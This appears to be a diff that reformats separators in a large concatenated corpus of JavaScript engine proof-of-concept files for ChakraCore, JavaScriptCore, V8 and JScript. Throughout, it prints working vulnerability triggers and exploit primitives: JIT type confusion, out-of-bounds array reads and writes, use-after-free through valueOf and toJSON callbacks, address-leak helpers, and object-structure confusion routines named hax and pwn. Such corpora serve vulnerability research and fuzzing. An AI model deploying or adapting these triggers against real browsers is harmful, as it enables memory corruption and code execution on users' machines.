@@ -27,8 +27,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------function opt(arr, arr2) {
+---------------------------------------------------------
+function opt(arr, arr2) {
     arr[0] = 1.1;
     Math.max.apply(Math, arr2);
     arr[0] = 2.3023e-320;
@@ -51,8 +51,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------"use strict";
+---------------------------------------------------------
+"use strict";
 
 function func(a, b, c) {
     a[0] = 1.2;
@@ -80,8 +80,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------function trigger() {
+---------------------------------------------------------
+function trigger() {
     try {
     } catch ({x}) {
         var x = 1;
@@ -93,8 +93,8 @@ main();
 trigger();
 
 
-
----------------------------------------------------------let f = new Function("console.log(arguments[300]);");
+---------------------------------------------------------
+let f = new Function("console.log(arguments[300]);");
 let a = [1,2,3];
 let b = [];
 b.length = 1000;
@@ -120,8 +120,8 @@ a.__proto__ = proto;
 f(1, ...a, ...b);
 
 
-
----------------------------------------------------------function opt() {
+---------------------------------------------------------
+function opt() {
     for (let i = 0; i < 100; i++) {
         let j = i - 2;
         switch (i) {
@@ -162,8 +162,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------function inlinee() {
+---------------------------------------------------------
+function inlinee() {
     return inlinee.arguments[0];
 }
 
@@ -198,8 +198,8 @@ function main() {
 }
 
 
-
----------------------------------------------------------function opt(arr, s) {
+---------------------------------------------------------
+function opt(arr, s) {
     arr[0] = 1.1;
 
     if (s !== null) {
@@ -237,15 +237,15 @@ function main() {
 main();
 
 
-
----------------------------------------------------------Object.prototype.__defineGetter__(1000, () => 2);
+---------------------------------------------------------
+Object.prototype.__defineGetter__(1000, () => 2);
 
 let locales = ['mr', 'bs', 'ee-TG', 'ms', 'kam-KE', 'mt', 'ha', 'es-HN', 'ml-IN', 'ro-MD', 'kab-DZ', 'he', 'es-CO', 'my', 'es-PA', 'az-Latn', 'mer', 'en-NZ', 'xog-UG', 'sg', 'fr-GP', 'sr-Cyrl-BA', 'hi', 'fil-PH', 'lt-LT', 'si', 'en-MT', 'si-LK', 'luo-KE', 'it-CH', 'teo', 'mfe', 'sk', 'uz-Cyrl-UZ', 'sl', 'rm-CH', 'az-Cyrl-AZ', 'fr-GQ', 'kde', 'sn', 'cgg-UG', 'so', 'fr-RW', 'es-SV', 'mas-TZ', 'en-MU', 'sq', 'hr', 'sr', 'en-PH', 'ca', 'hu', 'mk-MK', 'fr-TD', 'nb', 'sv', 'kln-KE', 'sw', 'nd', 'sr-Latn', 'el-GR', 'hy', 'ne', 'el-CY', 'es-CR', 'fo-FO', 'pa-Arab-PK', 'seh', 'ar-YE', 'ja-JP', 'ur-PK', 'pa-Guru', 'gl-ES', 'zh-Hant-HK', 'ar-EG', 'nl', 'th-TH', 'es-PE', 'fr-KM', 'nn', 'kk-Cyrl-KZ', 'kea', 'lv-LV', 'kln', 'tzm-Latn', 'yo', 'gsw-CH', 'ha-Latn-GH', 'is-IS', 'pt-BR', 'cs', 'en-PK', 'fa-IR', 'zh-Hans-SG', 'luo', 'ta', 'fr-TG', 'kde-TZ', 'mr-IN', 'ar-SA', 'ka-GE', 'mfe-MU', 'id', 'fr-LU', 'de-LU', 'ru-MD', 'cy', 'zh-Hans-HK', 'te', 'bg-BG', 'shi-Latn', 'ig', 'ses', 'ii', 'es-BO', 'th', 'ko-KR', 'ti', 'it-IT', 'shi-Latn-MA', 'pt-MZ', 'ff-SN', 'haw', 'zh-Hans', 'so-KE', 'bn-IN', 'en-UM', 'to', 'id-ID', 'uz-Cyrl', 'en-GU', 'es-EC', 'en-US-posix', 'sr-Latn-BA', 'is', 'luy', 'tr', 'en-NA', 'it', 'da', 'bo-IN', 'vun-TZ', 'ar-SD', 'uz-Latn-UZ', 'az-Latn-AZ', 'de', 'es-GQ', 'ta-IN', 'de-DE', 'fr-FR', 'rof-TZ', 'ar-LY', 'en-BW', 'asa', 'zh', 'ha-Latn', 'fr-NE', 'es-MX', 'bem-ZM', 'zh-Hans-CN', 'bn-BD', 'pt-GW', 'om', 'jmc', 'de-AT', 'kk-Cyrl', 'sw-TZ', 'ar-OM', 'et-EE', 'or', 'da-DK', 'ro-RO', 'zh-Hant', 'bm-ML', 'ja', 'fr-CA', 'naq', 'zu', 'en-IE', 'ar-MA', 'es-GT', 'uz-Arab-AF', 'en-AS', 'bs-BA', 'am-ET', 'ar-TN', 'haw-US', 'ar-JO', 'fa-AF', 'uz-Latn', 'en-BZ', 'nyn-UG', 'ebu-KE', 'te-IN', 'cy-GB', 'uk', 'nyn', 'en-JM', 'en-US', 'fil', 'ar-KW', 'af-ZA', 'en-CA', 'fr-DJ', 'ti-ER', 'ig-NG', 'en-AU', 'ur', 'fr-MC', 'pt-PT', 'pa', 'es-419', 'fr-CD', 'en-SG', 'bo-CN', 'kn-IN', 'sr-Cyrl-RS', 'lg-UG', 'gu-IN', 'ee', 'nd-ZW', 'bem', 'uz', 'sw-KE', 'sq-AL', 'hr-HR', 'mas-KE', 'el', 'ti-ET', 'es-AR', 'pl', 'en', 'eo', 'shi', 'kok', 'fr-CF', 'fr-RE', 'mas', 'rof', 'ru-UA', 'yo-NG', 'dav-KE', 'gv-GB', 'pa-Arab', 'es', 'teo-UG', 'ps', 'es-PR', 'fr-MF', 'et', 'pt', 'eu', 'ka', 'rwk-TZ', 'nb-NO', 'fr-CG'];
 Intl.getCanonicalLocales(locales);
 
 
-
----------------------------------------------------------function log(){
+---------------------------------------------------------
+function log(){
     var str = "<h3>";
     for(var i=0;i<arguments.length;i++){
         str+=arguments[i];
@@ -264,8 +264,8 @@ for (i = 0; i < ar.length; i++) {
 }
 
 
-
----------------------------------------------------------function opt(arr, index) {
+---------------------------------------------------------
+function opt(arr, index) {
     arr[0] = 1.1;
     typeof(arr[index]);
     arr[0] = 2.3023e-320;
@@ -289,8 +289,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------function f() {
+---------------------------------------------------------
+function f() {
     print(arguments);
 }
 
@@ -298,8 +298,8 @@ let call = new Proxy(Function.prototype.call, {});  // proxy calls set the flag
 call.call(f);
 
 
-
----------------------------------------------------------<script language="Jscript.Encode">
+---------------------------------------------------------
+<script language="Jscript.Encode">
 var vars = new Array(100);
 
 var arr = new Array(1000);
@@ -322,8 +322,8 @@ go();
 </script>
 
 
-
----------------------------------------------------------function asmModule() {
+---------------------------------------------------------
+function asmModule() {
     'use asm';
 
     let a = [1, 2, 3, 4];
@@ -344,8 +344,8 @@ go();
 asmModule(1);
 
 
-
----------------------------------------------------------var ARROW_ARG = /^([^\(]+?)=>/;
+---------------------------------------------------------
+var ARROW_ARG = /^([^\(]+?)=>/;
 
 var fn = foo => { foo(); }
 
@@ -355,8 +355,8 @@ var args2 = fn.toString().match(ARROW_ARG);
 // null in Chrome 50
 
 
-
----------------------------------------------------------function f(x) {
+---------------------------------------------------------
+function f(x) {
     arguments;
 
     {
@@ -369,8 +369,8 @@ for (let i = 0; i < 10000; i++)
     f();
 
 
-
----------------------------------------------------------function foo(trigger) {
+---------------------------------------------------------
+function foo(trigger) {
   return (trigger ? -0 : 0) - 0;
 }
 
@@ -379,8 +379,8 @@ assertEquals(0, foo(false));
 assertEquals(-0, foo(true)); // Failure: expected <-0> found <0>
 
 
-
----------------------------------------------------------function corrupt(array, offset, oob_byte) {
+---------------------------------------------------------
+function corrupt(array, offset, oob_byte) {
     var base = -0x7FFFFFC1 + offset;
     array[base - (-0x80000000)] = 0x4B;
     array[base + 0x7FFFFFE1]    = 0x4B;
@@ -398,8 +398,8 @@ var exploit_array = new Uint8Array(0x40);
 corrupt(exploit_array, -2, 0x80);
 
 
-
----------------------------------------------------------function opt(str) {
+---------------------------------------------------------
+function opt(str) {
     for (let i = 0; i < 200; i++) {
         let tmp = str.charCodeAt('AAAAAAAAAA' + str + 'BBBBBBBBBB');
     }
@@ -409,8 +409,8 @@ opt('x');
 opt(0x1234);
 
 
-
----------------------------------------------------------// Run with --thresholdForFTLOptimizeAfterWarmUp=1000
+---------------------------------------------------------
+// Run with --thresholdForFTLOptimizeAfterWarmUp=1000
 
 // First array probably required to avoid COW backing storage or so...
 const v3 = [1337,1337,1337,1337];
@@ -429,8 +429,8 @@ while (true) {
 }
 
 
-
----------------------------------------------------------// ./ch poc.js -ForceDeferParse
+---------------------------------------------------------
+// ./ch poc.js -ForceDeferParse
 (function f() {
     with ({}) {
         (function () {
@@ -440,15 +440,15 @@ while (true) {
 }());
 
 
-
----------------------------------------------------------arr=[];
+---------------------------------------------------------
+arr=[];
 for (var i = 0; i < 100000; i++)
     arr[i] = [];
 arr.indexOf(new Object(), {valueOf:function(){arr.length = 0}})
 
 
-
----------------------------------------------------------var d = new Array(1,2,3);
+---------------------------------------------------------
+var d = new Array(1,2,3);
 class dummy{
 
   constructor(){
@@ -483,8 +483,8 @@ function test(){
 var o = a.map.call(p, test);
 
 
-
----------------------------------------------------------var f = function()
+---------------------------------------------------------
+var f = function()
 {
   var o = { a: {}, b: { ba: { baa: 0, bab: [] }, bb: {}, bc: { bca: {bcaa: 0, bcab: 0, bcac: this} } } };
   o.b.bc.bca.bcab = 0;
@@ -493,8 +493,8 @@ var o = a.map.call(p, test);
 while(true) f(f);
 
 
-
----------------------------------------------------------<script language="Jscript.Encode">
+---------------------------------------------------------
+<script language="Jscript.Encode">
 
 var s = 'a';
 for(var i=0;i<28;i++) {
@@ -508,8 +508,8 @@ r.compile(s);
 </script>
 
 
-
----------------------------------------------------------function cons() {
+---------------------------------------------------------
+function cons() {
 
 }
 
@@ -541,8 +541,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------function opt() {
+---------------------------------------------------------
+function opt() {
     let obj = '2.3023e-320';
     for (let i = 0; i < 1; i++) {
         obj.x = 1;
@@ -560,8 +560,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------function Module() {
+---------------------------------------------------------
+function Module() {
     'use asm';
     function f() {
         arr();
@@ -578,8 +578,8 @@ let f = Module();
 f();
 
 
-
----------------------------------------------------------boom=(function(stdlib,foreign,heap){
+---------------------------------------------------------
+boom=(function(stdlib,foreign,heap){
     "use asm";
     var Uint8ArrayView=new stdlib.Uint8Array(heap);
     var Int32ArrayView=new stdlib.Int32Array(heap);
@@ -596,8 +596,8 @@ for (var i = 0; i < 400; ++i) { // Trigger optimization
 }
 
 
-
----------------------------------------------------------var buf = new ArrayBuffer( 0x10010);
+---------------------------------------------------------
+var buf = new ArrayBuffer( 0x10010);
 var numbers = new Uint8Array(buf);
 
 function v(){
@@ -613,8 +613,8 @@ function compareNumbers(a, b) {
 numbers.sort(compareNumbers);
 
 
-
----------------------------------------------------------var d = Object.defineProperty;
+---------------------------------------------------------
+var d = Object.defineProperty;
 
 var noobj = {
   get: function () {
@@ -634,8 +634,8 @@ Object.defineProperty = f;
 var q = new Intl.NumberFormat(["en"]);
 
 
-
----------------------------------------------------------function opt(o, c, value) {
+---------------------------------------------------------
+function opt(o, c, value) {
     o.b = 1;
 
     class A extends c {
@@ -664,14 +664,14 @@ function main() {
 main();
 
 
-
----------------------------------------------------------r2 = new RegExp("(?=)*", "g");
+---------------------------------------------------------
+r2 = new RegExp("(?=)*", "g");
 s0 = Array(220000700).join('a'); // the size could be different
 result = s0.match(r2);
 
 
-
----------------------------------------------------------var a = [];
+---------------------------------------------------------
+var a = [];
 
 class dummy{}
 
@@ -703,8 +703,8 @@ j.splice.call(a, 0, ...q);
 a[0xfffff1ec - 1] = 10;
 
 
-
----------------------------------------------------------function opt(arg) {
+---------------------------------------------------------
+function opt(arg) {
   let x = arguments.length;
   a1 = new Array(0x10);
   a2 = new Array(2); a2[0] = 1.1; a2[1] = 1.1;
@@ -725,8 +725,8 @@ for (let j = 0; j< 100000; j++) {
 opt.apply(null, large);
 
 
-
----------------------------------------------------------function f() {
+---------------------------------------------------------
+function f() {
     ({
         a: {
             b = 0x1111,
@@ -738,8 +738,8 @@ opt.apply(null, large);
 f();
 
 
-
----------------------------------------------------------var a = [];
+---------------------------------------------------------
+var a = [];
 for (var i = 0; i < 100; i++)
     a.push(i + 0.123);
 
@@ -747,8 +747,8 @@ var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});
 // b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]
 
 
-
----------------------------------------------------------let ab = new ArrayBuffer(1024);
+---------------------------------------------------------
+let ab = new ArrayBuffer(1024);
 
 function hax(o, changeProto) {
     // The argument type for |o| will be object of group OG1 or OG2. OG1 will
@@ -831,8 +831,8 @@ for (let i = 0; i < 100000; i++) {
 pwn(evilObj, true);
 
 
-
----------------------------------------------------------class MyRegExp extends RegExp {
+---------------------------------------------------------
+class MyRegExp extends RegExp {
   exec(str) {
     const r = super.exec.call(this, str);
     r[0] = 0; // Value could be changed to something arbitrary
@@ -843,8 +843,8 @@ pwn(evilObj, true);
 'a'.match(new MyRegExp('.', 'g'));
 
 
-
----------------------------------------------------------function opt(o) {
+---------------------------------------------------------
+function opt(o) {
     return o.r.input;
 }
 
@@ -876,8 +876,8 @@ o.input = input;
 print(o.input);  // The normal interpreter doesn't see the attributes, so it will just call the underneath getter using callCustomGetter.
 
 
-
----------------------------------------------------------var y = 0;
+---------------------------------------------------------
+var y = 0;
 var t = [1,2,3];
 var t2 = [4,4,4];
 var mp = new Proxy(t2, {
@@ -957,8 +957,8 @@ t.__proto__ = mp;
 q(...t);
 
 
-
----------------------------------------------------------function opt() {
+---------------------------------------------------------
+function opt() {
     let obj = [2.3023e-320];
     for (let i = 0; i < 1; i++) {
         obj.x = 1;  // In the first analysis, BailOnNotObject emitted
@@ -976,8 +976,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------function inlinee() {
+---------------------------------------------------------
+function inlinee() {
     return inlinee.arguments[0];
 }
 
@@ -1011,8 +1011,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------function trigger() {
+---------------------------------------------------------
+function trigger() {
     let a, b, c;
 
     function g() {
@@ -1027,8 +1027,8 @@ main();
 trigger();
 
 
-
 ---------------------------------------------------------
+
 var b2 = new Uint8Array(171);
 b2[0] = 0x0;
 b2[1] = 0x61;
@@ -1209,8 +1209,8 @@ var i = new WebAssembly.Instance(mod, { imports : {imported_func : f}, js : {mem
 i.exports.accumulate.call(0, 5);
 
 
-
----------------------------------------------------------let x = 1;
+---------------------------------------------------------
+let x = 1;
 
 this.x = 0x1234;  // IsShadowed
 
@@ -1226,8 +1226,8 @@ this.__defineSetter__('x', () => {});
 this.x;
 
 
-
----------------------------------------------------------<script language="Jscript.Encode">
+---------------------------------------------------------
+<script language="Jscript.Encode">
 
 var vars = new Array(100);
 for(var i=0;i<100;i++) vars[i] = {};
@@ -1244,8 +1244,8 @@ Array.prototype.join.call(vars);
 </script>
 
 
-
----------------------------------------------------------(function func(arg = function () {
+---------------------------------------------------------
+(function func(arg = function () {
     print(func);  // SetHasOwnLocalInClosure should be called for the param scope in the PostVisitFunction function.
 }()) {
     print(func);
@@ -1255,13 +1255,13 @@ Array.prototype.join.call(vars);
 })();
 
 
-
----------------------------------------------------------var a = new Array(0x7fffffff);
+---------------------------------------------------------
+var a = new Array(0x7fffffff);
 var x = [13, 37, ...a, ...a];
 
 
-
----------------------------------------------------------function Module() {
+---------------------------------------------------------
+function Module() {
     'use asm';
 
     function f() {
@@ -1281,8 +1281,8 @@ function recur() {
 recur();
 
 
-
----------------------------------------------------------<script language="Jscript.Encode">
+---------------------------------------------------------
+<script language="Jscript.Encode">
 
 var o1 = {toJSON:function(){
   alert('o1');
@@ -1300,8 +1300,8 @@ JSON.stringify(o1);
 </script>
 
 
-
----------------------------------------------------------function f(){
+---------------------------------------------------------
+function f(){
   try{
     postMessage("test", "http://127.0.0.1", [q])
   } catch(e){ }
@@ -1317,8 +1317,8 @@ try{
 } catch(e){ }
 
 
-
----------------------------------------------------------var str = "AISpsjFbWLAZEYyNzx8j5yG8cWkK2Mgb";
+---------------------------------------------------------
+var str = "AISpsjFbWLAZEYyNzx8j5yG8cWkK2Mgb";
 
 function go(a,b,c) {
   try {
@@ -1336,8 +1336,8 @@ function go(a,b,c) {
 go(-0,{},23704);
 
 
-
----------------------------------------------------------var array = [[{}], [1.1]];
+---------------------------------------------------------
+var array = [[{}], [1.1]];
 
 function transition() {
   for(var i = 0; i < array.length; i++){
@@ -1373,14 +1373,14 @@ f();
 assertEquals(expected, double_arr2[1]);
 
 
-
----------------------------------------------------------let args = new Array(0x10000);
+---------------------------------------------------------
+let args = new Array(0x10000);
 args = args.fill(0x1234).join(', ');
 eval('new Array(' + args + ')');
 
 
-
----------------------------------------------------------// flags: --allow-natives-syntax
+---------------------------------------------------------
+// flags: --allow-natives-syntax
 var buf = new ArrayBuffer(0x10000);
 var arr2 = new Uint8Array(buf).fill(55);
 var tmp = {};
@@ -1393,8 +1393,8 @@ tmp[Symbol.toPrimitive] = function () {
 print(Array.prototype.indexOf.call(arr2, 0x00, tmp));
 
 
-
----------------------------------------------------------class MyRegExp extends RegExp {
+---------------------------------------------------------
+class MyRegExp extends RegExp {
   exec(str) {
     const r = super.exec.call(this, str);
     if (r) r.length=0;
@@ -1405,8 +1405,8 @@ const result = 'a'.match(new MyRegExp('.', 'g'));
 var crash = result[0].x;
 
 
-
----------------------------------------------------------function i_want_to_break_free() {
+---------------------------------------------------------
+function i_want_to_break_free() {
     var n = 0x40000;
     var m = 10;
     var regex = new RegExp("(ab)".repeat(n), "g"); // g flag to trigger the vulnerable path
@@ -1431,8 +1431,8 @@ try { i_want_to_break_free(); } catch (e) { }
 console.log(typeof(i_am_free));  // will print "object"
 
 
-
----------------------------------------------------------var array = [];
+---------------------------------------------------------
+var array = [];
 var funky = {
   toJSON: function() { array.length = 1; return "funky"; }
 };
@@ -1441,8 +1441,8 @@ array[0] = funky;
 JSON.stringify(array);
 
 
-
----------------------------------------------------------var b = new Array(1,2,3);
+---------------------------------------------------------
+var b = new Array(1,2,3);
 var d = new Array(1,2,3);
 d.length = 0x200000;
 d.fill(7);
@@ -1490,8 +1490,8 @@ for(item in o){
 //alert(h);
 
 
-
----------------------------------------------------------var ba;
+---------------------------------------------------------
+var ba;
 function s(){
     ba = this;
 }
@@ -1506,8 +1506,8 @@ ba.length = 100000;
 f(1, 2, 3);
 
 
-
----------------------------------------------------------function f() {
+---------------------------------------------------------
+function f() {
     let arr = new Uint32Array(0x1000);
     for (let i = 0; i < 0x7fffffff;) {
         arr[++i] = 0x1234;
@@ -1517,8 +1517,8 @@ f(1, 2, 3);
 f();
 
 
-
----------------------------------------------------------<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+---------------------------------------------------------
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
 <script language="Jscript.Encode">
  
 alert('start');
@@ -1546,8 +1546,8 @@ alert('failed');
 </script>
 
 
-
----------------------------------------------------------function v5(v6, v8) {
+---------------------------------------------------------
+function v5(v6, v8) {
     if (v8) {
         // Triggers the rollback etc. in a recursive call.
         const v11 = new v5(v6);
@@ -1565,8 +1565,8 @@ for (let v19 = 0; v19 < 1337; v19++) {
 const v22 = new v5(v5, true);
 
 
-
----------------------------------------------------------function opt(o, proto, value) {
+---------------------------------------------------------
+function opt(o, proto, value) {
     o.b = 1;
 
     let tmp = {__proto__: proto};
@@ -1590,8 +1590,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------a = [1];
+---------------------------------------------------------
+a = [1];
 b = [];
 a.__defineGetter__(0, function () {
      b.length = 0xffffffff;
@@ -1600,8 +1600,8 @@ a.__defineGetter__(0, function () {
 c = a.concat(b);
 
 
-
----------------------------------------------------------let o = {
+---------------------------------------------------------
+let o = {
     get a() {},
     0: 0,  // Deoptimizing object header inlining
     a: 0x1234
@@ -1610,8 +1610,8 @@ c = a.concat(b);
 o.a;  // Type confusion
 
 
-
----------------------------------------------------------var once = false;
+---------------------------------------------------------
+var once = false;
 var a = 1;
 
 function f(){
@@ -1626,8 +1626,8 @@ function f(){
 JSON.parse("[1, 2, [4, 5]]", f);
 
 
-
----------------------------------------------------------function f() {
+---------------------------------------------------------
+function f() {
     ({a = ([arguments]) => {
     }} = 1);
 
@@ -1637,8 +1637,8 @@ JSON.parse("[1, 2, [4, 5]]", f);
 f();
 
 
-
----------------------------------------------------------function gc() {
+---------------------------------------------------------
+function gc() {
     for (let i = 0; i < 0x10; i++)
         new ArrayBuffer(0x1000000);
 }
@@ -1656,8 +1656,8 @@ gc();
 print(new Array(0x100).splice(0));
 
 
-
----------------------------------------------------------// /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
+---------------------------------------------------------
+// /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
 // The PoC will confuse objX with objY.
 // objX will have structure S1, objY structure S2.
 let objX = {objProperty: {fetchme: 1234}};
@@ -1744,8 +1744,8 @@ global = match;
 hax();
 
 
-
----------------------------------------------------------function inlinee() {
+---------------------------------------------------------
+function inlinee() {
     new Error();
     return inlinee.arguments[0];
 }
@@ -1780,13 +1780,13 @@ function main() {
 main();
 
 
-
----------------------------------------------------------var hugetempl = {length: 0x24924925};
+---------------------------------------------------------
+var hugetempl = {length: 0x24924925};
 var huge = new Float64Array(hugetempl);
 
 
-
----------------------------------------------------------function write(begin, end, step, num) {
+---------------------------------------------------------
+function write(begin, end, step, num) {
     for (var i = begin; i < end; i += step) view[i] = num;
 }
 
@@ -1797,8 +1797,8 @@ write(0, 0x4000, 1, 0x1234);
 write(0x3000000e, 0x40000010, 0x10000, 1851880825);
 
 
-
----------------------------------------------------------async function trigger(a = class b {
+---------------------------------------------------------
+async function trigger(a = class b {
     [await 1]() {
     }
 }) {
@@ -1812,8 +1812,8 @@ for (let i = 0; i < 100000; i++) {
 trigger();
 
 
-
----------------------------------------------------------function convert(data){
+---------------------------------------------------------
+function convert(data){
     a = new ArrayBuffer(8);
     b = new Float64Array(a);
     c = new Uint8Array(a);
@@ -1852,8 +1852,8 @@ v = leak(a)
 console.log(v)
 
 
-
----------------------------------------------------------var extern_arr_vars = [];
+---------------------------------------------------------
+var extern_arr_vars = [];
 for (var i = 0; i < 16; i++) {
     extern_arr_vars[i] = new Array();
 }
@@ -1869,8 +1869,8 @@ for (var i = 0; i < 2 ; i++) {
 extern_arr_vars[15].join(new Date().getVarDate());
 
 
-
----------------------------------------------------------var array_buffer = new ArrayBuffer(4000);
+---------------------------------------------------------
+var array_buffer = new ArrayBuffer(4000);
 var u32arr = new Uint32Array(array_buffer);
 var end = {
   valueOf: function() {
@@ -1881,8 +1881,8 @@ var end = {
 var oob = u32arr.subarray(0, end);
 
 
-
----------------------------------------------------------const double2int = (v) => {
+---------------------------------------------------------
+const double2int = (v) => {
   let buf = new ArrayBuffer(8);
   let farr = new Float64Array(buf);
   let iarr = new Uint32Array(buf);
@@ -1909,8 +1909,8 @@ try {
 }
 
 
-
----------------------------------------------------------function createModule() {
+---------------------------------------------------------
+function createModule() {
     'use asm';
     const a = 1.0;
     function f() {
@@ -1924,8 +1924,8 @@ var f = createModule();
 f();
 
 
-
----------------------------------------------------------function f(){
+---------------------------------------------------------
+function f(){
   try{
     postMessage("test", "http://127.0.0.1", [q])
   } catch(e){ }
@@ -1939,8 +1939,8 @@ var a = new Uint8Array(q);
 a.copyWithin(0x12345678, o, 0x32345678);
 
 
-
----------------------------------------------------------function opt(x_obj, arr) {
+---------------------------------------------------------
+function opt(x_obj, arr) {
     arr[0] = 1.1;
     
     x_obj.a = arr;  // Replacing the vtable.
@@ -1962,8 +1962,8 @@ arr[1] = {};  // in-place type conversion
 alert(arr);
 
 
-
----------------------------------------------------------load('test/mjsunit/wasm/wasm-constants.js');
+---------------------------------------------------------
+load('test/mjsunit/wasm/wasm-constants.js');
 load('test/mjsunit/wasm/wasm-module-builder.js');
 const builder = new WasmModuleBuilder();
 builder.addMemory(16, 32);
@@ -1978,8 +1978,8 @@ module.then = (resolve) => {
 WebAssembly.instantiate(module);
 
 
-
----------------------------------------------------------function f() {
+---------------------------------------------------------
+function f() {
     ({a = () => {
         let arguments;
     }} = 1);
@@ -1990,14 +1990,14 @@ WebAssembly.instantiate(module);
 f();
 
 
-
----------------------------------------------------------var str2 = String.fromCharCode(0x2c); //add `,` into single character string cache
+---------------------------------------------------------
+var str2 = String.fromCharCode(0x2c); //add `,` into single character string cache
 var o2 = new Array(0x20000000);
 String.prototype.split.call(o2,'');
 
 
-
----------------------------------------------------------function opt(a, b, always_true = true) {
+---------------------------------------------------------
+function opt(a, b, always_true = true) {
     a[0] = 1234;
     b[0] = 0;
 
@@ -2026,8 +2026,8 @@ for (let i = 0; i < 10000; i++) {
 }
 
 
-
----------------------------------------------------------function opt(arr, proto) {
+---------------------------------------------------------
+function opt(arr, proto) {
     arr[0] = 1.1;
     let tmp = {__proto__: proto};
     arr[0] = 2.3023e-320;
@@ -2047,8 +2047,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------let o = {};
+---------------------------------------------------------
+let o = {};
 for (let i in {xx: 0}) {
     for (let j = 0; j < 2; j++) {
         o[i];
@@ -2057,8 +2057,8 @@ for (let i in {xx: 0}) {
 }
 
 
-
----------------------------------------------------------function opt(a, b, v) {
+---------------------------------------------------------
+function opt(a, b, v) {
     if (b.length < 1)
         return;
 
@@ -2088,8 +2088,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------// Flags: --allow-natives-syntax
+---------------------------------------------------------
+// Flags: --allow-natives-syntax
 
 // Inlining shift with holey smi arrays shouldn't deopt just because it
 // encounters the hole on the copy step.
@@ -2121,15 +2121,15 @@ test(0);
 test(0);
 
 
-
----------------------------------------------------------var arr1 = new Object();
+---------------------------------------------------------
+var arr1 = new Object();
 arr1.toString = function(){ CollectGarbage(); };
 var arrs = new Array(0x7fff);
 var z = new ActiveXObject(arrs, [arr1]);
 
 
-
----------------------------------------------------------var q;
+---------------------------------------------------------
+var q;
 function g(){
     q = g.caller;
     return 7;
@@ -2142,8 +2142,8 @@ Object.defineProperty(Array.prototype, "3", {get : g});
 q(0x77777777, 0x77777777, 0);
 
 
-
----------------------------------------------------------let a = '';
+---------------------------------------------------------
+let a = '';
 let b = 'A'.repeat(0x10000);
 for (let i = 0; i < 0x10000; i++) {
     a = 'BBBBBBBBB' + a + b;
@@ -2154,8 +2154,8 @@ print(b.length);
 print(a[0]);
 
 
-
----------------------------------------------------------let args = new Array(0x10000);
+---------------------------------------------------------
+let args = new Array(0x10000);
 args.fill();
 args = args.map((_, i) => 'a' + i).join(', ');
 
@@ -2193,13 +2193,13 @@ for (let i = 0; i < 0x10000; i++)
     gun.trigger();
 
 
-
----------------------------------------------------------var v = SIMD.Int32x4(1, 2, 3, 4);
+---------------------------------------------------------
+var v = SIMD.Int32x4(1, 2, 3, 4);
 v.toLocaleString(1, 2, 3, 4)
 
 
-
----------------------------------------------------------function opt(arr) {
+---------------------------------------------------------
+function opt(arr) {
     if (arr.length <= 15)
         return;
 
@@ -2220,8 +2220,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------function gc() {
+---------------------------------------------------------
+function gc() {
     for (let i = 0; i < 10; i++) {
         new ArrayBuffer(1024 * 1024 * 10);
     }
@@ -2275,8 +2275,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------function trigger() {
+---------------------------------------------------------
+function trigger() {
     let arr = [1.1];
     let i = 0;
     for (; i < 1000; i += 0.5) {
@@ -2295,8 +2295,8 @@ for (let i = 0; i < 100; i++) {
 }
 
 
-
----------------------------------------------------------function opt(obj) {
+---------------------------------------------------------
+function opt(obj) {
     for (let i in obj.inlinee.call({})) {
     }
 
@@ -2317,8 +2317,8 @@ function main() {
 main();
 
 
-
----------------------------------------------------------var a = [1];
+---------------------------------------------------------
+var a = [1];
 a.length = 1000;
 var j = [];
 
@@ -2336,7 +2336,6 @@ a.__proto__ = o;
 var r = j.reverse.call(a);
 r.length = 0xfffffffe;
 r[0xfffffffe - 1] = 10;
-
 
 
 ---------------------------------------------------------
